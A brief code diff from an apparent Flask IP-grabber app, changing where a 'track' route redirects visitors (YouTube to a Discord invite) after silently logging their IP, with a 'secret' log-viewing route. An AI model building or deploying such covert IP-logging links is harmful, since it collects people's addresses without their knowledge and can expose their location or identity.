@@ -28,7 +28,7 @@ def track():
         ip = request.remote_addr
 
     log_ip(ip)
-    return redirect("https://www.youtube.com")
+    return redirect("https://discord.gg/TMKATk684K")
 
 # Secret route to view your logs in the browser
 @app.route('/my-secret-logs')
